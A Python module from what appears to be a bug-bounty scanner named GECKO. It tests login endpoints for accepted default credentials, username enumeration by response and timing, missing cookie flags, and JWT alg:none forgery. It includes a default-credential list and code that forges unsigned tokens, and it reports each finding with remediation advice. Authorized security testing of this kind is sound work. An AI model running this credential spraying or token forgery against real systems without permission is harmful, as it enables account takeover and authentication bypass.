"""
GECKO - Authentication Vulnerability Tester
Tests for weak authentication: default creds, cookie security, username enumeration, JWT alg:none.
Designed for bug bounty / authorized testing on targets like OWASP Juice Shop.
"""
import asyncio
import json
import time
import base64
import re
import statistics
from urllib.parse import urlparse


# Default credentials to test (common web app + Juice Shop specific)
DEFAULT_CREDS = [
    ("admin@juice-sh.op", "admin123"),
    ("admin@juice-sh.op", "password"),
    ("admin@juice-sh.op", "admin"),
    ("test@juice-sh.op", "test"),
    ("jim@juice-sh.op", "ncc-1701"),
    ("admin@admin.com", "admin"),
    ("admin@example.com", "admin"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
    ("guest", "guest"),
    ("test", "test"),
]

# Login endpoint patterns
LOGIN_PATHS = [
    "/rest/user/login",
    "/api/login",
    "/auth/login",
    "/login",
    "/api/auth/login",
    "/api/v1/auth/login",
    "/api/authenticate",
]


class AuthTester:
    name = "auth_tester"
    severity = "critical"

    async def run(self, target, session, context):
        findings = []
        base = target.rstrip("/")

        # Discover login endpoints
        endpoints = list(context.get("endpoints") or [])
        login_endpoints = [e for e in endpoints if any(
            p in e.lower() for p in ["login", "signin", "auth", "authenticate"]
        )]
        # Always include known paths
        for path in LOGIN_PATHS:
            full = f"{base}{path}"
            if full not in login_endpoints:
                login_endpoints.append(full)

        tasks = []
        seen = set()

        for ep in login_endpoints[:8]:
            # Test default credentials
            key = f"creds|{ep}"
            if key not in seen:
                seen.add(key)
                tasks.append(_test_default_creds(session, ep))

            # Test username enumeration via timing
            key2 = f"enum|{ep}"
            if key2 not in seen:
                seen.add(key2)
                tasks.append(_test_username_enum(session, ep))

        # Test cookie security on all endpoints
        tasks.append(_test_cookie_security(session, base, endpoints))

        # Test JWT if in context
        jwt_token = (context.get("tokens") or {}).get("jwt")
        if jwt_token:
            tasks.append(_test_jwt_alg_none(session, base, jwt_token, endpoints))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
            elif isinstance(r, dict):
                findings.append(r)

        return findings


async def _test_default_creds(session, endpoint):
    findings = []
    try:
        for email, password in DEFAULT_CREDS:
            try:
                payload = {"email": email, "password": password}
                r = await session.post(
                    endpoint,
                    json=payload,
                    timeout=8,
                    follow_redirects=True
                )
                body = r.text

                # Success indicators
                if r.status_code in (200, 201) and any(
                    kw in body.lower() for kw in ["token", "authentication", "success", '"id"', "welcome"]
                ) and "error" not in body.lower()[:200]:
                    findings.append({
                        "type": "Default Credentials Accepted",
                        "severity": "CRITICAL",
                        "endpoint": endpoint,
                        "credential": f"{email}:{password}",
                        "evidence": f"HTTP {r.status_code} — response contains auth token/success indicators",
                        "confidence": "HIGH",
                        "cwe": "CWE-521",
                        "owasp": "A07:2021",
                        "poc": f'curl -X POST {endpoint} -H "Content-Type: application/json" -d \'{{"email":"{email}","password":"{password}"}}\'',
                        "remediation": "Change default credentials immediately; enforce strong password policy",
                    })
                    break  # Stop after first successful login
            except Exception:
                continue
    except Exception:
        pass
    return findings


async def _test_username_enum(session, endpoint):
    """Detect username enumeration via response body or timing differences."""
    try:
        KNOWN_INVALID = "zzz_nonexistent_user_gecko@gecko.invalid"
        COMMON_VALID = "admin@juice-sh.op"

        results_invalid = []
        results_valid = []

        for _ in range(3):
            t0 = time.time()
            r = await session.post(endpoint, json={"email": KNOWN_INVALID, "password": "wrongpass"}, timeout=10)
            results_invalid.append((time.time() - t0, r.text[:300]))

        for _ in range(3):
            t0 = time.time()
            r = await session.post(endpoint, json={"email": COMMON_VALID, "password": "wrongpass"}, timeout=10)
            results_valid.append((time.time() - t0, r.text[:300]))

        avg_invalid = statistics.mean(t[0] for t in results_invalid)
        avg_valid = statistics.mean(t[0] for t in results_valid)
        time_diff = abs(avg_valid - avg_invalid)

        # Response body enumeration
        body_invalid = results_invalid[0][1].lower()
        body_valid = results_valid[0][1].lower()

        if body_invalid != body_valid:
            # Different responses reveal whether user exists
            return {
                "type": "Username Enumeration (Response Difference)",
                "severity": "MEDIUM",
                "endpoint": endpoint,
                "evidence": (
                    f"Invalid user response: '{body_invalid[:80]}' | "
                    f"Valid user response: '{body_valid[:80]}'"
                ),
                "confidence": "HIGH",
                "cwe": "CWE-204",
                "owasp": "A07:2021",
                "remediation": "Return identical error messages for invalid username and invalid password",
            }

        # Timing-based enumeration
        if time_diff > 0.2:
            return {
                "type": "Username Enumeration (Timing)",
                "severity": "MEDIUM",
                "endpoint": endpoint,
                "evidence": f"Timing difference {time_diff:.2f}s (invalid: {avg_invalid:.2f}s, valid: {avg_valid:.2f}s)",
                "confidence": "MEDIUM",
                "cwe": "CWE-204",
                "owasp": "A07:2021",
                "remediation": "Use constant-time comparison; add artificial delay to normalize response times",
            }
    except Exception:
        pass
    return None


async def _test_cookie_security(session, base, endpoints):
    findings = []
    try:
        r = await session.get(base, timeout=8, follow_redirects=True)
        cookies_header = r.headers.get("set-cookie", "")
        if not cookies_header:
            return findings

        cookie_lower = cookies_header.lower()
        issues = []

        if "httponly" not in cookie_lower:
            issues.append("Missing HttpOnly flag (JS can read cookie)")
        if "secure" not in cookie_lower and base.startswith("https"):
            issues.append("Missing Secure flag (cookie sent over HTTP)")
        if "samesite" not in cookie_lower:
            issues.append("Missing SameSite flag (CSRF risk)")

        if issues:
            findings.append({
                "type": "Insecure Cookie Configuration",
                "severity": "MEDIUM",
                "endpoint": base,
                "evidence": f"Set-Cookie: {cookies_header[:200]}",
                "issues": issues,
                "confidence": "HIGH",
                "cwe": "CWE-614",
                "owasp": "A07:2021",
                "remediation": "Set HttpOnly; Secure; SameSite=Strict on all session cookies",
            })
    except Exception:
        pass
    return findings


async def _test_jwt_alg_none(session, base, jwt_token, endpoints):
    """Test if server accepts JWT with alg:none (signature bypass)."""
    findings = []
    try:
        # Parse JWT
        parts = jwt_token.split(".")
        if len(parts) != 3:
            return findings

        header_b64 = parts[0]
        payload_b64 = parts[1]

        # Decode header
        padding = "=" * (-len(header_b64) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64 + padding))
        payload_data = json.loads(base64.urlsafe_b64decode(payload_b64 + padding))

        # Forge with alg:none
        header["alg"] = "none"
        forged_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        forged_token = f"{forged_header}.{payload_b64}."

        # Test on an authenticated endpoint
        auth_endpoints = [e for e in endpoints if "/rest/" in e or "/api/" in e][:5]
        for ep in auth_endpoints:
            try:
                r = await session.get(
                    ep,
                    headers={"Authorization": f"Bearer {forged_token}"},
                    timeout=8,
                    follow_redirects=True
                )
                if r.status_code == 200 and "error" not in r.text.lower()[:100]:
                    findings.append({
                        "type": "JWT Algorithm Confusion (alg:none)",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "evidence": f"Server accepted JWT with alg:none — signature verification bypassed",
                        "confidence": "HIGH",
                        "cwe": "CWE-347",
                        "owasp": "A02:2021",
                        "poc": f'Authorization: Bearer {forged_token}',
                        "remediation": "Reject JWTs with alg:none; enforce algorithm allowlist server-side",
                    })
                    break
            except Exception:
                continue
    except Exception:
        pass
    return findings
